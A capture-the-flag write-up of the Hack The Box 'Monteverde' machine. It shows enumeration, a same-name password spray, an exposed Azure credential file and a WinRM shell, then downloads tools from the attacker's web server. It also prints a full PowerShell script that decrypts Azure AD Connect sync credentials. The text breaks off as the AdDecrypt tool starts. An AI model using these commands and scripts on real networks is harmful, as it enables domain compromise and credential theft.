# Monteverde

URL: https://app.hackthebox.com/machines/Monteverde

Level: Medium

Date: 27 Apr 2024

- [Enumeration](#enumeration)
- [Users](#users)
- [Valid user](#valid-user)
- [Shares](#shares)
- [Another valid user](#another-valid-user)
- [User flag](#user-flag)
- [Bloodhound](#bloodhound)
- [WinPEAS](#winpeas)
- [ADSync](#adsync)
- [Root flag](#root-flag)
## enumeration

```bash
$ sudo nmap -n -p- 10.10.10.172 -oA nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-27 18:15 CEST
Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 25.61% done; ETC: 18:19 (0:03:17 remaining)
Nmap scan report for 10.10.10.172
Host is up (0.048s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49729/tcp open  unknown
61254/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 202.98 seconds
```

...sounds definitely a Windows active directory domain controller!

We run a more detailed scan on relevant services (Kerberos, Netbios, ... )

```bash
$ sudo nmap -n -p88,135,139,389,445 -sC -sV 10.10.10.172 -oA nmap2
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-27 18:19 CEST
Nmap scan report for 10.10.10.172
Host is up (0.047s latency).

PORT    STATE SERVICE       VERSION
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-27 16:19:57Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-04-27T16:20:03
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.24 seconds
```

(we need to figure why we get `MEGABANK.LOCAL0` instead of `LOCAL` :)

We also run `enum4linux`:

```bash
$ enum4linux 10.10.10.172
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Apr 27 18:27:55 2024

 =========================================( Target Information )=========================================

Target ........... 10.10.10.172
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.10.172 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.10.172 )================================

Looking up status of 10.10.10.172
No reply from 10.10.10.172

 ===================================( Session Check on 10.10.10.172 )===================================


[+] Server 10.10.10.172 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.10.172 )================================

Domain Name: MEGABANK
Domain Sid: S-1-5-21-391775091-850290835-3566037492

[+] Host is part of a domain (not a workgroup)


 ===================================( OS information on 10.10.10.172 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.10.172 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.10.10.172 )=======================================

index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

 =================================( Share Enumeration on 10.10.10.172 )=================================

do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.172


 ============================( Password Policy Information for 10.10.10.172 )============================



[+] Attaching to 10.10.10.172 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.172)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] MEGABANK
        [+] Builtin

[+] Password Info for Domain: MEGABANK

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: 41 days 23 hours 53 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 7


 =======================================( Groups on 10.10.10.172 )=======================================


[+] Getting builtin groups:

group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]

[+]  Getting builtin group memberships:

Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group: Users' (RID: 545) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs

[+]  Getting local groups:

group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]
group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
group:[ADSyncAdmins] rid:[0x451]
group:[ADSyncOperators] rid:[0x452]
group:[ADSyncBrowse] rid:[0x453]
group:[ADSyncPasswordSet] rid:[0x454]

[+]  Getting local group memberships:

Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Group: ADSyncAdmins' (RID: 1105) has member: Couldn't lookup SIDs

[+]  Getting domain groups:

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]

[+]  Getting domain group memberships:

Group: 'Trading' (RID: 2610) has member: MEGABANK\dgalanos
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\Administrator
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Azure Admins' (RID: 2601) has member: MEGABANK\mhope
Group: 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
Group: 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
Group: 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
Group: 'Domain Users' (RID: 513) has member: MEGABANK\mhope
Group: 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
Group: 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
Group: 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
Group: 'Domain Users' (RID: 513) has member: MEGABANK\roleary
Group: 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
Group: 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
Group: 'HelpDesk' (RID: 2611) has member: MEGABANK\roleary
Group: 'Group Policy Creator Owners' (RID: 520) has member: MEGABANK\Administrator
Group: 'Operations' (RID: 2609) has member: MEGABANK\smorgan

 ==================( Users on 10.10.10.172 via RID cycling (RIDS: 500-550,1000-1050) )==================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ===============================( Getting printer info for 10.10.10.172 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Apr 27 18:29:28 2024
```

We get lots of results.

Now we add `megabank.local` to our `/etc/hosts` file:

```bash
root@kaligra:~# tail -n1 /etc/hosts
10.10.10.172    megabank.local
```

We found account `AAD_987d7f2f57d2` with this description:

*"Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE"*

From `enum4linux` we have a little list of users:

## users

```bash
joshua@kaligra:~/Documents/htb/machines/monteverde$ cat > users
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

```bash
$ awk -F '[' '{ print $2 }' users | awk -F ']' '{ print $1 }'
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

Let's try if we found some valid account with same user/pass.

```bash
$ crackmapexec smb 10.10.10.172 -u users2 -p users2
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:Guest STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:smorgan STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:Guest STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

## valid user

Found a valid user! 

`SABatchJobs:SABatchJobs`

## shares

```bash
$ smbclient -L \\\\10.10.10.172\\ -U MEGABANK/SABatchJobs%SABatchJobs

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        azure_uploads   Disk
        C$              Disk      Default share
        E$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
        users$          Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We can also use `smbmap` tool:

```bash
$ smbmap -u SABatchJobs -p SABatchJobs -d megabank.local -H 10.10.10.172
[+] IP: 10.10.10.172:445        Name: megabank.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        azure_uploads                                           READ ONLY
        C$                                                      NO ACCESS       Default share
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        users$                                                  READ ONLY
```

We try to explore `users$` share, and we found an interesting file (`azure.xml`) into `mhope` folder:

```bash
$ smbclient \\\\10.10.10.172\\users$ -U MEGABANK/SABatchJobs%SABatchJobs
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 14:12:48 2020
  ..                                  D        0  Fri Jan  3 14:12:48 2020
  dgalanos                            D        0  Fri Jan  3 14:12:30 2020
  mhope                               D        0  Fri Jan  3 14:41:18 2020
  roleary                             D        0  Fri Jan  3 14:10:30 2020
  smorgan                             D        0  Fri Jan  3 14:10:24 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \> cd dgalanos\
smb: \dgalanos\> ls
  .                                   D        0  Fri Jan  3 14:12:30 2020
  ..                                  D        0  Fri Jan  3 14:12:30 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \dgalanos\> cd ..
smb: \> cd mhope\
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 14:41:18 2020
  ..                                  D        0  Fri Jan  3 14:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 14:40:23 2020

                31999 blocks of size 4096. 28979 blocks available
smb: \mhope\> get azure.xml
getting file \mhope\azure.xml of size 1212 as azure.xml (6.1 KiloBytes/sec) (average 6.1 KiloBytes/sec)
smb: \mhope\> quit
```


## another valid user

File contains `mhope` credentials:

```bash
$ cat azure.xml
▒▒<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therXXXXXXXXXXXXXX</S> <====================
    </Props>
  </Obj>
</Objs>
```

## user flag

We user `evil-winrm`

```bash
$ evil-winrm -i 10.10.10.172 -u mhope
Enter Password:

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\mhope\Documents> cd ..
*Evil-WinRM* PS C:\Users\mhope> cd Desktop
*Evil-WinRM* PS C:\Users\mhope\Desktop> dir


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/26/2024   5:41 AM             34 user.txt


*Evil-WinRM* PS C:\Users\mhope\Desktop> gc user.txt
0a4f62c6ac54a9XXXXXXXXXXXXXXXX
*Evil-WinRM* PS C:\Users\mhope\Desktop>
```

Let's enumerate `mhope` groups

```powershell
*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope /domain
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   4/27/2024 9:57:35 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

## Bloodhound


Let's generate data to ingest into `Bloodhound`

```bash
$ python3 ./bloodhound.py -d megabank.local -u mhope -p '4n0therD4y@n0th3r$' -v --zip -c All -dc monteverde.megabank.local -ns 10.10.10.172
DEBUG: Authentication: username/password
DEBUG: Resolved collection methods: group, dcom, rdp, localadmin, objectprops, trusts, session, psremote, acl
DEBUG: Using DNS to retrieve domain information
DEBUG: Querying domain controller information from DNS
DEBUG: Using domain hint: megabank.local
INFO: Found AD domain: megabank.local
DEBUG: Found primary DC: MONTEVERDE.MEGABANK.LOCAL
..
..
..
..
DEBUG: Found 580 SID: S-1-5-21-391775091-850290835-3566037492-1601
DEBUG: DCE/RPC binding: ncacn_np:10.10.10.172[\PIPE\lsarpc]
DEBUG: Resolved SID to name: MHOPE@MEGABANK.LOCAL
DEBUG: Write worker obtained a None value, exiting
DEBUG: Write worker is done, closing files
INFO: Done in 00M 09S
INFO: Compressing output into 20240430155425_bloodhound.zip
```

![](Pasted%20image%2020240430170931.png)


![](Pasted%20image%2020240430170953.png)

`Find Principals with DCSync Rights`

![](Pasted%20image%2020240430171308.png)

## winPEAS

Let's spawn a Python web server on our attacker machine:

```bash
joshua@kaligra:/opt/tools/win_tools/winPEAS$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Let's download `winPEAS` on our target with Powershell

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> Invoke-WebRequest "http://10.10.14.16:8080/winPEASx64.exe" -OutFile "winPEASx64.exe"
*Evil-WinRM* PS C:\Users\mhope\Documents> dir


    Directory: C:\Users\mhope\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2024   8:18 AM        1678336 winPEASx64.exe
```

![](Pasted%20image%2020240430171933.png)

In winPEAS output we see references to *cloud credentials*


```powershell
  [+] Cloud Credentials
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    C:\Users\mhope\.azure\TokenCache.dat (Azure Token Cache)
    Accessed:1/3/2020 5:36:14 AM -- Size:7896

    C:\Users\mhope\.azure\AzureRMContext.json (Azure RM Context)
    Accessed:1/3/2020 5:35:57 AM -- Size:2794
```

```json
*Evil-WinRM* PS C:\Users\mhope\.azure> gc AzureRMContext.json
{
  "DefaultContextKey": "372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com",
  "EnvironmentTable": {},
  "Contexts": {
    "372efea9-7bc4-4b76-8839-984b45edfb98 - john@a67632354763outlook.onmicrosoft.com": {
      "Account": {
        "Id": "john@a67632354763outlook.onmicrosoft.com",
        "Credential": null,
        "Type": "User",
        "TenantMap": {},
        "ExtendedProperties": {
          "Tenants": "372efea9-7bc4-4b76-8839-984b45edfb98"
        }
      },
      "Tenant": {
        "Id": "372efea9-7bc4-4b76-8839-984b45edfb98",
        "Directory": null,
        "ExtendedProperties": {}
      },
      "Subscription": null,
      "Environment": {
        "Name": "AzureCloud",
        "OnPremise": false,
        "ServiceManagementUrl": "https://management.core.windows.net/",
        "ResourceManagerUrl": "https://management.azure.com/",
        "ManagementPortalUrl": "https://go.microsoft.com/fwlink/?LinkId=254433",
        "PublishSettingsFileUrl": "https://go.microsoft.com/fwlink/?LinkID=301775",
        "ActiveDirectoryAuthority": "https://login.microsoftonline.com/",
        "GalleryUrl": "https://gallery.azure.com/",
        "GraphUrl": "https://graph.windows.net/",
        "ActiveDirectoryServiceEndpointResourceId": "https://management.core.windows.net/",
        "StorageEndpointSuffix": "core.windows.net",
        "SqlDatabaseDnsSuffix": ".database.windows.net",
        "TrafficManagerDnsSuffix": "trafficmanager.net",
        "AzureKeyVaultDnsSuffix": "vault.azure.net",
        "AzureKeyVaultServiceEndpointResourceId": "https://vault.azure.net",
        "GraphEndpointResourceId": "https://graph.windows.net/",
        "DataLakeEndpointResourceId": "https://datalake.azure.net/",
        "BatchEndpointResourceId": "https://batch.core.windows.net/",
        "AzureDataLakeAnalyticsCatalogAndJobEndpointSuffix": "azuredatalakeanalytics.net",
        "AzureDataLakeStoreFileSystemEndpointSuffix": "azuredatalakestore.net",
        "AdTenant": "Common",
        "VersionProfiles": [],
        "ExtendedProperties": {
          "OperationalInsightsEndpoint": "https://api.loganalytics.io/v1",
          "OperationalInsightsEndpointResourceId": "https://api.loganalytics.io",
          "AzureAnalysisServicesEndpointSuffix": "asazure.windows.net",
          "AnalysisServicesEndpointResourceId": "https://region.asazure.windows.net",
          "AzureAttestationServiceEndpointSuffix": "attest.azure.net",
          "AzureAttestationServiceEndpointResourceId": "https://attest.azure.net"
        }
      },
      "VersionProfile": null,
      "TokenCache": {
        "CacheData": null
      },
      "ExtendedProperties": {}
    }
  },
  "ExtendedProperties": {}
}
```

## ADSync

We came across this link

https://blog.xpnsec.com/azuread-connect-for-redteam/

other link

https://github.com/dirkjanm/adconnectdump

and we try using this powershell script:


```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)

```

anyway, we get no luck:

```powershell
*Evil-WinRM* PS C:\users\mhope> . .\exploit.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 1726]: <f:WSManFault Code='1726' Machine='10.10.10.172' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>The WSMan provider host process did not return a proper response.  A provider in the host process may have behaved improperly. </f:Message></f:WSManFault>

Error: Exiting with code 1
```

Let's try another solution

https://github.com/VbScrub/AdSyncDecrypt

https://github.com/VbScrub/AdSyncDecrypt/releases

```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> iwr "http://10.10.14.34:8080/AdDecrypt.exe" -OutFile AdDecrypt.exe
*Evil-WinRM* PS C:\Users\mhope\Documents> iwr "http://10.10.14.34:8080/mcrypt.dll" -OutFile mcrypt.dll
```

sigh...

```powershell
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\bin> c:\users\mhope\documents\AdDecrypt.exe

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

